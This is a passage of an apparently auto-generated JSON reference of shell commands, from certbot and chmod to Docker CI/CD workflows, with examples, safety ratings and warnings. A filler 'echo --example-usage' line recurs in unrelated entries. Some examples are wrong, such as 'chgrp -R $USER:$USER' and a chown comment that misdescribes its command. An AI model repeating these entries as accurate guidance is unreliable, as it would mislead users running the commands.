      "sudo certbot renew --dry-run  # Test certificate renewal without making changes",
      "sudo certbot revoke --cert-path /path/to/cert.pem  # Revoke and delete specified certificate",
      "sudo certbot --nginx -d example.com --email admin@example.com --agree-tos  # Obtain SSL certificate for domain using nginx"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "caution",
    "syntaxPattern": "certbot [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Initial SSL setup with nginx",
        "commands": "sudo certbot --nginx -d mysite.com && nginx -t && sudo nginx -s reload",
        "explanation": "Get certificate, test config, reload nginx",
        "title": "sudo && nginx && sudo"
      },
      {
        "scenario": "Setup automatic renewal",
        "commands": "sudo certbot renew --dry-run && sudo crontab -e",
        "explanation": "Test renewal then setup cron job for automation",
        "title": "sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "nginx",
        "relationship": "combo",
        "reason": "Certbot can automatically configure nginx for SSL"
      },
      {
        "name": "apache2",
        "relationship": "combo",
        "reason": "Certbot integrates with Apache for SSL setup"
      },
      {
        "name": "cron",
        "relationship": "combo",
        "reason": "Schedule automatic certificate renewals"
      }
    ],
    "warnings": [
      "Requires port 80/443 accessible from internet",
      "Rate limits apply for certificate requests",
      "Automatic renewal needs proper setup to avoid outages"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://certbot.eff.org/docs/"
      },
      {
        "platform": "macos",
        "url": "https://certbot.eff.org/docs/"
      },
      {
        "platform": "generic",
        "url": "https://certbot.eff.org/instructions"
      }
    ],
    "distroNotes": {
      "linux": "Available via package managers or snap",
      "macos": "Install via Homebrew: brew install certbot",
      "windows": "Available via WSL"
    }
  },
  {
    "name": "cgcreate",
    "subtitle": "Control Group Create",
    "description": "Create control groups for process resource management",
    "examples": [
      "sudo cgcreate -g memory:webservers  # Create control group for managing web server memory",
      "sudo cgcreate -g cpu:limited  # Create control group for CPU limitation",
      "echo 1G | sudo tee /sys/fs/cgroup/memory/webservers/memory.limit_in_bytes  # Set 1GB memory limit for webservers group",
      "sudo cgclassify -g memory:webservers 1234  # Move process 1234 to webservers control group",
      "sudo cgexec -g memory:webservers httpd  # Execute httpd process within webservers control group"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "cgcreate [options] -g subsystem:group",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Resource-limited service setup",
        "commands": "sudo cgcreate -g memory,cpu:webservice && echo 512M | sudo tee /sys/fs/cgroup/memory/webservice/memory.limit_in_bytes && echo 50000 | sudo tee /sys/fs/cgroup/cpu/webservice/cpu.cfs_quota_us",
        "explanation": "Create control group with memory and CPU limits",
        "title": "sudo && echo | sudo && echo | sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "systemctl",
        "relationship": "alternative",
        "reason": "systemd provides cgroup management"
      },
      {
        "name": "cgexec",
        "relationship": "combo",
        "reason": "Execute programs within control groups"
      }
    ],
    "warnings": [
      "cgroups v2 has different interface",
      "systemd manages most cgroups automatically"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/cgcreate.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "chage",
    "subtitle": "Change Age",
    "description": "Change user password aging and expiration policies",
    "examples": [
      "sudo chage -M 90 username  # Set maximum password age to 90 days",
      "sudo chage -m 7 username  # Require 7 days between password changes",
      "sudo chage -W 14 username  # Warn user 14 days before password expires",
      "sudo chage -E 2024-12-31 username  # Set account to expire on specific date",
      "sudo chage -l username  # List password aging information for user",
      "sudo chage username  # Interactively set password aging parameters",
      "sudo chage -M 90 -m 7 -W 14 username  # Set max age 90 days, min age 7 days, warning 14 days before expiration"
    ],
    "platform": [
      "linux"
    ],
    "category": "security",
    "safety": "caution",
    "syntaxPattern": "chage [options] username",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Enterprise password policy",
        "commands": "sudo chage -M 90 -m 7 -W 14 username",
        "explanation": "Set comprehensive password policy: 90 day max, 7 day min, 14 day warning",
        "title": "sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "passwd",
        "relationship": "combo",
        "reason": "Both manage password policies"
      }
    ],
    "warnings": [
      "Dates must be in YYYY-MM-DD format",
      "Changes affect next password change"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/chage.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "chgrp",
    "subtitle": "change group",
    "description": "Change group ownership of files and directories",
    "examples": [
      "chgrp developers project.txt  # Change file group to 'developers' group",
      "chgrp -R www-data /var/www/html/  # Change group ownership of directory and all contents",
      "chgrp 1000 file.txt  # Set group ownership using group ID number",
      "chgrp --reference=template.txt new-file.txt  # Set group ownership to match another file",
      "chgrp -v staff *.txt  # Show what changes are being made",
      "chgrp -R developers /project/shared  # Recursively change group ownership to developers for shared project"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "chgrp [options] <group> <file>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Set group permissions for web directory",
        "commands": "chgrp -R www-data /var/www/ && chmod -R g+w /var/www/",
        "explanation": "Change group to www-data and give group write permissions",
        "title": "chgrp && chmod"
      },
      {
        "scenario": "Fix permissions after file transfer",
        "commands": "chgrp -R $USER:$USER ~/Downloads/ && chmod -R 755 ~/Downloads/",
        "explanation": "Set proper ownership and permissions for downloaded files",
        "title": "chgrp && chmod"
      }
    ],
    "relatedCommands": [
      {
        "name": "chown",
        "relationship": "similar",
        "reason": "Changes user ownership, can also change group"
      },
      {
        "name": "chmod",
        "relationship": "combo",
        "reason": "Often used together to set complete file permissions"
      },
      {
        "name": "groups",
        "relationship": "info",
        "reason": "List available groups for current user"
      }
    ],
    "warnings": [
      "May require sudo to change group to one you're not a member of",
      "Group must exist on the system",
      "Some filesystems don't support group ownership"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/chgrp.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/chgrp.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/chgrp-invocation.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "chkrootkit",
    "subtitle": "Check Rootkit",
    "description": "Rootkit detection tool for system security verification",
    "examples": [
      "chkrootkit  # Run all available rootkit detection tests",
      "chkrootkit -x  # Run expert mode with additional tests",
      "chkrootkit -q  # Run in quiet mode showing only suspicious findings",
      "chkrootkit -l  # Display all available rootkit detection tests",
      "sudo chkrootkit -q | tee /var/log/chkrootkit.log  # Run quiet scan and save results to log file"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "chkrootkit [options] [test]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive malware detection",
        "commands": "chkrootkit && rkhunter --check --sk",
        "explanation": "Run multiple rootkit detection tools for thorough analysis",
        "title": "chkrootkit && rkhunter"
      }
    ],
    "relatedCommands": [
      {
        "name": "rkhunter",
        "relationship": "similar",
        "reason": "Alternative rootkit detection tool with more features"
      },
      {
        "name": "maldet",
        "relationship": "similar",
        "reason": "Linux malware detection tool"
      }
    ],
    "warnings": [
      "May produce false positives on legitimate system modifications",
      "Should be run from read-only media for forensic analysis",
      "Requires root privileges for complete system access"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "http://www.chkrootkit.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "chmod",
    "subtitle": "change mode",
    "description": "Change file and directory permissions",
    "examples": [
      "chmod +x script.sh  # Add execute permission for all users",
      "chmod 700 private-file.txt  # Owner can read/write/execute, no access for others",
      "chmod -R 755 public-folder/  # Recursively set directory permissions",
      "chmod go-w important.conf  # Prevent group and others from modifying file",
      "chmod 644 *.html  # Owner can read/write, others can read only",
      "chmod 755 directory/ && find directory/ -type f -exec chmod 644 {} \\;  # Set directory permissions recursively"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "caution",
    "syntaxPattern": "chmod [options] <mode> <file>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Find and fix script permissions",
        "commands": "find . -name '*.sh' -exec chmod +x {} \\;",
        "explanation": "Make all shell scripts executable",
        "title": "find ;"
      },
      {
        "scenario": "Secure directory permissions",
        "commands": "chmod 750 ~/private && chmod 640 ~/private/*",
        "explanation": "Set directory and file permissions for security",
        "title": "chmod && chmod"
      }
    ],
    "relatedCommands": [
      {
        "name": "chown",
        "relationship": "combo",
        "reason": "Change file ownership after changing permissions"
      },
      {
        "name": "ls",
        "relationship": "combo",
        "reason": "Use ls -la to see current permissions"
      },
      {
        "name": "umask",
        "relationship": "similar",
        "reason": "Set default permissions for new files"
      }
    ],
    "warnings": [
      "chmod 777 is dangerous - gives full access to everyone",
      "Execute permission on directories means access permission",
      "Numeric notation: 4=read, 2=write, 1=execute"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/chmod.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/chmod.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL only - not applicable to Windows filesystem"
    }
  },
  {
    "name": "chown",
    "subtitle": "change owner",
    "description": "Change file and directory ownership",
    "examples": [
      "chown $USER important-file.txt  # Take ownership of file for current user",
      "chown www-data:www-data /var/www/html/*  # Set web server ownership for website files",
      "chown -R user:group project/  # Change ownership of directory and all contents",
      "chown :developers shared-folder/  # Set group ownership while keeping current owner",
      "chown --reference=template.txt new-file.txt  # Copy ownership from template file to new file",
      "chown -R www-data:www-data /var/www/ && find /var/www -type f -exec chown root:root {} \\;  # Change ownership recursively"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "caution",
    "syntaxPattern": "chown [options] <owner>[:<group>] <file>...",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Fix permissions after file transfer",
        "commands": "chown -R $USER:$USER ~/Downloads/ && chmod -R 755 ~/Downloads/",
        "explanation": "Take ownership and set proper permissions for downloaded files",
        "title": "chown && chmod"
      },
      {
        "scenario": "Secure sensitive files",
        "commands": "chown root:root /etc/passwd && chmod 644 /etc/passwd",
        "explanation": "Set proper ownership and permissions for system files",
        "title": "chown && chmod"
      }
    ],
    "relatedCommands": [
      {
        "name": "chmod",
        "relationship": "combo",
        "reason": "Often used together to set both ownership and permissions"
      },
      {
        "name": "ls",
        "relationship": "combo",
        "reason": "Use ls -la to see current ownership before changing"
      },
      {
        "name": "sudo",
        "relationship": "combo",
        "reason": "Often need sudo to change ownership to other users"
      }
    ],
    "warnings": [
      "Need sudo to change ownership to different user",
      "Changing ownership can break applications expecting specific owners",
      "Use colon (:) to separate user and group, not dot (.)"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/chown.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/chown.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL only - not applicable to Windows filesystem"
    }
  },
  {
    "name": "chroot",
    "subtitle": "Change Root",
    "description": "Change root directory for process and children",
    "examples": [
      "sudo chroot /mnt/rescue /bin/bash  # Start bash shell in rescue system root",
      "sudo chroot /var/chroot/myapp /usr/bin/myapp  # Run application in chrooted environment",
      "sudo chroot /mnt/sda1 /bin/bash  # Access installed system for recovery operations",
      "sudo mkdir -p /var/chroot/myapp && sudo chroot /var/chroot/myapp /bin/bash  # Create and enter chroot environment"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "security",
    "safety": "caution",
    "syntaxPattern": "chroot [options] newroot [command]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Setup and enter chroot for repair",
        "commands": "sudo mount /dev/sda1 /mnt/repair && sudo mount --bind /proc /mnt/repair/proc && sudo chroot /mnt/repair /bin/bash",
        "explanation": "Mount system partition and enter for maintenance",
        "title": "sudo && sudo && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "jail",
        "relationship": "similar",
        "reason": "jail provides similar sandboxing on BSD systems"
      },
      {
        "name": "docker",
        "relationship": "modern-alternative",
        "reason": "containers provide more complete isolation"
      }
    ],
    "warnings": [
      "Requires careful setup of essential directories like /proc, /dev",
      "Programs may fail without proper environment setup",
      "Useful for system recovery and security sandboxing"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/chroot.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/chroot.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "clamav",
    "subtitle": "Clam AntiVirus",
    "description": "Open-source antivirus engine for malware detection",
    "examples": [
      "clamscan -r .  # Recursively scan current directory for malware",
      "freshclam  # Update ClamAV virus definition database",
      "clamscan -r -v /home/user  # Scan user directory with detailed output",
      "clamscan -r --remove /suspicious/path  # Scan and automatically remove infected files",
      "clamscan -r --log=scan.log /home && grep FOUND scan.log  # Recursive scan with logging and report threats"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "clamscan [options] [file/directory]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete malware detection workflow",
        "commands": "freshclam && clamscan -r --bell --log=/var/log/clamav.log /",
        "explanation": "Update definitions and scan entire system with logging",
        "title": "freshclam && clamscan"
      }
    ],
    "relatedCommands": [
      {
        "name": "rkhunter",
        "relationship": "combo",
        "reason": "Complementary rootkit detection"
      },
      {
        "name": "chkrootkit",
        "relationship": "combo",
        "reason": "Additional malware detection capabilities"
      }
    ],
    "warnings": [
      "Requires regular database updates for effectiveness",
      "May impact system performance during scans",
      "False positives possible with legitimate software"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.clamav.net/documents"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "cmake",
    "subtitle": "Cross-platform Make",
    "description": "Cross-platform build system generator",
    "examples": [
      "cmake .  # Generate build files for current directory",
      "cmake -B build -S .  # Generate build files in build directory from current source",
      "cmake -DCMAKE_BUILD_TYPE=Release .  # Configure for release build with optimizations",
      "cmake --build build  # Build project using generated build system",
      "cmake --install build  # Install built project to system directories",
      "cmake --build build --target help  # Show all available build targets",
      "cmake --build build --parallel 4  # Build using 4 parallel jobs",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "cmake [options] [source-dir]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete CMake workflow",
        "commands": "cmake -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --parallel && cmake --install build",
        "explanation": "Configure, build, and install in one workflow",
        "title": "cmake && cmake && cmake"
      }
    ],
    "relatedCommands": [
      {
        "name": "make",
        "relationship": "generates",
        "reason": "CMake can generate Makefiles as build system"
      },
      {
        "name": "ninja",
        "relationship": "alternative-backend",
        "reason": "CMake can generate Ninja build files instead of Makefiles"
      }
    ],
    "warnings": [
      "Always prefer out-of-source builds (separate build directory)",
      "CMakeCache.txt stores configuration, delete to reconfigure",
      "Cross-platform but may need platform-specific tweaks"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://cmake.org/cmake/help/latest/"
      },
      {
        "platform": "macos",
        "url": "https://cmake.org/cmake/help/latest/"
      },
      {
        "platform": "windows",
        "url": "https://cmake.org/cmake/help/latest/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "code",
    "subtitle": "VS Code",
    "description": "Visual Studio Code command-line interface",
    "examples": [
      "code filename.js  # Open JavaScript file in Visual Studio Code",
      "code .  # Open current directory as VS Code workspace",
      "code --install-extension ms-python.python  # Install Python extension for VS Code",
      "code --list-extensions  # Show all installed VS Code extensions",
      "code --wait config.json  # Open file and wait for editor to close (useful in scripts)",
      "code --diff file1.txt file2.txt  # Open files in diff view for comparison",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "code [options] [file/folder]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Project setup workflow",
        "commands": "mkdir myproject && cd myproject && npm init -y && code .",
        "explanation": "Create project directory, initialize npm, open in VS Code",
        "title": "mkdir && cd && npm && code"
      }
    ],
    "relatedCommands": [
      {
        "name": "vim",
        "relationship": "alternative",
        "reason": "Terminal-based editor alternative"
      }
    ],
    "warnings": [
      "Requires VS Code to be installed and in PATH",
      "Some features require extensions"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://code.visualstudio.com/docs/editor/command-line"
      },
      {
        "platform": "macos",
        "url": "https://code.visualstudio.com/docs/editor/command-line"
      },
      {
        "platform": "windows",
        "url": "https://code.visualstudio.com/docs/editor/command-line"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "composer",
    "subtitle": "Composer",
    "description": "Dependency manager for PHP",
    "examples": [
      "composer init  # Create composer.json file interactively",
      "composer install  # Install packages from composer.lock or composer.json",
      "composer require monolog/monolog  # Add Monolog logging library to project",
      "composer require --dev phpunit/phpunit  # Add PHPUnit testing framework as dev dependency",
      "composer update  # Update all packages to latest compatible versions",
      "composer validate  # Check composer.json for errors and completeness",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "composer <command> [options] [arguments]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Clean install with autoloader optimization",
        "commands": "composer install --no-dev --optimize-autoloader",
        "explanation": "Production installation with optimized class loading",
        "title": "composer"
      }
    ],
    "relatedCommands": [
      {
        "name": "php",
        "relationship": "combo",
        "reason": "Composer manages PHP packages"
      },
      {
        "name": "artisan",
        "relationship": "combo",
        "reason": "Laravel's command-line tool often used with Composer"
      }
    ],
    "warnings": [
      "composer.lock should be committed for reproducible installs",
      "Memory limit may need increasing for large projects",
      "Platform requirements can block package installation"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://getcomposer.org/doc/03-cli.md"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "compress",
    "subtitle": "Compress",
    "description": "Legacy Unix file compression utility",
    "examples": [
      "compress file.txt  # Compress file.txt to file.txt.Z",
      "uncompress file.txt.Z  # Decompress file.txt.Z to file.txt",
      "compress -f file.txt  # Force compression even if file grows",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "file-operations",
    "safety": "safe",
    "syntaxPattern": "compress [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Legacy system compatibility",
        "commands": "compress olddata.txt && scp olddata.txt.Z oldserver:",
        "explanation": "Compress for transfer to legacy Unix system",
        "title": "compress && scp"
      }
    ],
    "relatedCommands": [
      {
        "name": "gzip",
        "relationship": "replacement",
        "reason": "gzip provides better compression and is more widely used"
      },
      {
        "name": "uncompress",
        "relationship": "combo",
        "reason": "uncompress extracts .Z files created by compress"
      }
    ],
    "warnings": [
      "Legacy format, rarely used in modern systems",
      "Poor compression compared to modern algorithms"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/compress.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/compress.html"
      },
      {
        "platform": "windows",
        "url": "https://man7.org/linux/man-pages/man1/compress.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "conda",
    "subtitle": "Conda",
    "description": "Package and environment management system for data science",
    "examples": [
      "conda create -n myenv python=3.9 pandas numpy  # Creates new conda environment with Python 3.9 and data packages",
      "conda activate myenv  # Switches to the specified conda environment",
      "conda install scikit-learn matplotlib jupyter  # Installs machine learning and visualization packages",
      "conda env list  # Shows all available conda environments",
      "conda env export > environment.yml  # Creates environment file for sharing or backup",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "conda <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete ML environment setup",
        "commands": "conda create -n mlenv python=3.9 && conda activate mlenv && conda install pandas numpy scikit-learn matplotlib jupyter",
        "explanation": "Creates and sets up complete machine learning environment",
        "title": "conda && conda && conda"
      },
      {
        "scenario": "Clone and modify environment",
        "commands": "conda create --name newenv --clone oldenv && conda activate newenv && conda install tensorflow",
        "explanation": "Clones existing environment and adds TensorFlow",
        "title": "conda && conda && conda"
      }
    ],
    "relatedCommands": [
      {
        "name": "python3",
        "relationship": "manages",
        "reason": "Conda manages Python interpreters and packages"
      },
      {
        "name": "pip",
        "relationship": "complement",
        "reason": "Can be used alongside conda for packages not available in conda"
      },
      {
        "name": "mamba",
        "relationship": "alternative",
        "reason": "Faster drop-in replacement for conda"
      }
    ],
    "warnings": [
      "Mixing conda and pip can cause dependency conflicts",
      "Channel priority affects package versions installed",
      "Environment activation required before using packages",
      "Large environments can consume significant disk space"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.conda.io/en/latest/"
      },
      {
        "platform": "macos",
        "url": "https://docs.conda.io/en/latest/"
      },
      {
        "platform": "windows",
        "url": "https://docs.conda.io/en/latest/"
      },
      {
        "platform": "generic",
        "url": "https://conda.io/projects/conda/en/latest/user-guide/index.html"
      }
    ],
    "distroNotes": {
      "linux": "Available through Miniconda or Anaconda installers",
      "windows": "Available through Anaconda installer or command-line tools",
      "macos": "Available through Anaconda installer or Homebrew"
    }
  },
  {
    "name": "container-ci-cd-pipeline",
    "subtitle": "Container CI/CD Pipeline",
    "description": "Container-based CI/CD pipeline automation",
    "examples": [
      "gitlab-runner exec docker build-job --docker-image docker:20.10.16 --docker-volumes /var/run/docker.sock:/var/run/docker.sock  # Execute GitLab CI job locally with Docker-in-Docker capability",
      "docker run -d --name jenkins -p 8080:8080 -v jenkins_home:/var/jenkins_home -v /var/run/docker.sock:/var/run/docker.sock jenkins/jenkins:lts  # Run Jenkins with Docker socket access for container-based builds",
      "docker buildx create --use --platform linux/amd64,linux/arm64 --name multiarch-builder && docker buildx inspect --bootstrap  # Create multi-architecture builder for GitHub Actions workflows",
      "argocd app create webapp --repo https://github.com/user/k8s-configs --path manifests --dest-server https://kubernetes.default.svc --dest-namespace production  # Create ArgoCD application for GitOps-based Kubernetes deployment",
      "tkn pipeline start build-and-deploy --param git-url=https://github.com/user/app --param image-name=myapp:latest --workspace name=shared-data,volumeClaimTemplateFile=workspace-template.yaml  # Start Tekton pipeline with parameters and persistent workspace",
      "docker run -d --name buildkite-agent -e BUILDKITE_AGENT_TOKEN=$BUILDKITE_AGENT_TOKEN -v /var/run/docker.sock:/var/run/docker.sock buildkite/agent:3  # Run Buildkite agent with Docker access for containerized builds",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "<ci-tool> <pipeline-command> [options]",
    "prerequisites": [
      "ci-cd-system"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete CI/CD pipeline with security",
        "commands": "docker build -t myapp:$BUILD_NUMBER . && trivy image --exit-code 1 myapp:$BUILD_NUMBER && docker tag myapp:$BUILD_NUMBER registry.com/myapp:$BUILD_NUMBER && docker push registry.com/myapp:$BUILD_NUMBER && kubectl set image deployment/myapp app=registry.com/myapp:$BUILD_NUMBER",
        "explanation": "Build image, scan for vulnerabilities, push to registry, and deploy to Kubernetes",
        "title": "docker && trivy && docker && docker && kubectl"
      },
      {
        "scenario": "Multi-stage deployment pipeline",
        "commands": "docker-compose -f docker-compose.test.yml run --rm tests && docker build -t myapp:staging . && kubectl apply -f k8s/staging/ && kubectl rollout status deployment/myapp -n staging",
        "explanation": "Run tests, build staging image, deploy to staging, and wait for rollout",
        "title": "docker && docker && kubectl && kubectl"
      }
    ],
    "relatedCommands": [
      {
        "name": "git",
        "relationship": "combo",
        "reason": "Git triggers and provides source code for CI/CD pipelines"
      },
      {
        "name": "make",
        "relationship": "combo",
        "reason": "Makefiles often orchestrate CI/CD pipeline steps"
      },
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Deploy containers to Kubernetes in CD pipelines"
      }
    ],
    "warnings": [
      "Docker-in-Docker can have security and performance implications",
      "Image layer caching strategies vary between CI/CD systems",
      "Secrets management in CI/CD requires careful security considerations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.gitlab.com/ee/ci/docker/"
      },
      {
        "platform": "macos",
        "url": "https://docs.gitlab.com/ee/ci/docker/"
      },
      {
        "platform": "windows",
        "url": "https://docs.gitlab.com/ee/ci/docker/"
      },
      {
        "platform": "generic",
        "url": "https://docs.docker.com/ci-cd/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "container-development-workflow",
    "subtitle": "Container Development Workflow",
    "description": "Container-based development workflows and debugging",
    "examples": [
      "docker run -it --rm -v $(pwd):/app -v /app/node_modules -p 3000:3000 -e NODE_ENV=development node:18 npm run dev  # Run development server with source code volume mount and live reload",
      "docker-compose -f docker-compose.yml -f docker-compose.override.yml up --build --force-recreate  # Start development environment with compose overrides and fresh build",
      "docker run -it --rm -v $(pwd):/workspace -v /var/run/docker.sock:/var/run/docker.sock --cap-add SYS_PTRACE mcr.microsoft.com/vscode/devcontainers/base:ubuntu  # Run VS Code dev container with Docker socket access for debugging",
      "docker-compose up -d db && docker-compose exec db psql -U postgres -c 'CREATE DATABASE testdb;' && docker-compose exec db psql -U postgres testdb < fixtures/test-data.sql  # Start database, create test database, and load fixture data",
      "docker stats --format 'table {{.Container}}\t{{.CPUPerc}}\t{{.MemUsage}}\t{{.NetIO}}\t{{.BlockIO}}' && docker exec myapp top -p 1  # Monitor container resource usage and internal process activity",
      "docker run -it --rm -v $(pwd)/src:/app/src -v $(pwd)/package.json:/app/package.json -p 8080:8080 --name dev-server myapp:dev npm run start:dev  # Start development server with selective file mounting for hot reloading",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "<workflow-command> [options]",
    "prerequisites": [
      "docker-compose"
    ],
    "commandCombinations": [
      {
        "scenario": "Full-stack development environment",
        "commands": "docker-compose up -d redis postgres && sleep 10 && docker-compose up --build api && docker-compose up --build frontend",
        "explanation": "Start supporting services, wait for readiness, then start application services",
        "title": "docker && sleep && docker && docker"
      },
      {
        "scenario": "Testing workflow with clean environment",
        "commands": "docker-compose down -v && docker-compose build --no-cache test && docker-compose run --rm test npm run test:integration && docker-compose down",
        "explanation": "Clean environment, rebuild test image, run integration tests, cleanup",
        "title": "docker && docker && docker && docker"
      }
    ],
    "relatedCommands": [
      {
        "name": "nodemon",
        "relationship": "combo",
        "reason": "File watching for automatic container restarts"
      },
      {
        "name": "make",
        "relationship": "combo",
        "reason": "Makefiles often orchestrate container development workflows"
      },
      {
        "name": "tilt",
        "relationship": "alternative",
        "reason": "Advanced development workflow orchestration"
      }
    ],
    "warnings": [
      "File permissions can differ between host and container",
      "Volume mounts may not work consistently across different platforms",
      "Development containers should not be used in production"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.docker.com/develop/"
      },
      {
        "platform": "macos",
        "url": "https://docs.docker.com/develop/"
      },
      {
        "platform": "windows",
        "url": "https://docs.docker.com/develop/"
      },
      {
        "platform": "generic",
        "url": "https://code.visualstudio.com/docs/remote/containers"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "container-registry-management",
    "subtitle": "Container Registry Management",
    "description": "Container registry operations and image management",
    "examples": [
      "docker buildx build --platform linux/amd64,linux/arm64 --push -t myuser/myapp:latest -t myuser/myapp:v1.0.0 .  # Build and push multi-architecture image with multiple tags",
      "docker login myregistry.com --username myuser && docker tag myapp:latest myregistry.com/myuser/myapp:latest && docker push myregistry.com/myuser/myapp:latest  # Login to private registry and push tagged image",
      "cosign generate-key-pair && cosign sign --key cosign.key myregistry.com/myapp:latest && cosign verify --key cosign.pub myregistry.com/myapp:latest  # Generate key pair, sign image, and verify signature",
      "curl -u admin:password -X POST 'https://harbor.example.com/api/v2.0/projects' -H 'Content-Type: application/json' -d '{\"project_name\":\"myproject\",\"public\":false}'  # Create private project in Harbor registry using API",
      "aws ecr create-repository --repository-name myapp && aws ecr put-lifecycle-policy --repository-name myapp --lifecycle-policy-text file://lifecycle-policy.json  # Create ECR repository and apply lifecycle policy for image cleanup",
      "skopeo copy docker://source-registry.com/myapp:latest docker://dest-registry.com/myapp:latest --dest-creds user:pass  # Copy image between registries without local Docker daemon",
      "echo --example-usage  # Simplified example for echo command"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "<registry-tool> <command> [options]",
    "prerequisites": [
      "docker-cli"
    ],
    "commandCombinations": [
      {
        "scenario": "Secure image promotion pipeline",
        "commands": "trivy image myapp:latest && cosign sign --key cosign.key myapp:latest && docker tag myapp:latest prod-registry.com/myapp:v1.0.0 && docker push prod-registry.com/myapp:v1.0.0",
